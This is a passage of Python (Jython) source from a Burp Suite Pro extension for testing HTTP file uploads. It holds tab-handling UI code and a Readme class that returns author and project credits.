        self.gbc.gridy = 0
        self.gbc.weightx = 0
        self.gbc.weighty = 0
        self.add(self.lbl_title, self.gbc)
        self.gbc.gridx += 1
        self.gbc.weightx = 0
        self.add(self.btn_close, self.gbc)
        self.btn_close.addActionListener(self)
        self.pyparent.setTabComponentAt(index, self)
        customize_callback(self.pyparent)
        # This is no the most sensible UI choice to put the focus there, but better than not:
        # Select the new "1 x" tab:
        self.pyparent.setSelectedIndex(index)
        # Then select the "Upload Scanner" tab
        i = self.pyparent.getParent().indexOfTab("Upload Scanner")
        self.pyparent.getParent().setSelectedIndex(i)

    def actionPerformed(self, evt):
        if self.close_callback(self.index):
            self.pyparent.removeTabAt(self.pyparent.indexOfTab(self.title))
            self.pyparent = None
            self.close_callback = None


class Readme:
    @staticmethod
    def get_readme():
        about = """<html>Author: Tobias "floyd" Ospelt, @floyd_ch, https://www.floyd.ch<br>
modzero AG, @mod0, https://www.modzero.ch<br>
<br>
A Burp Suite Pro extension to do security tests for HTTP file uploads.<br>
For more information see https://github.com/modzero/mod0BurpUploadScanner/
</html>
"""
        return about
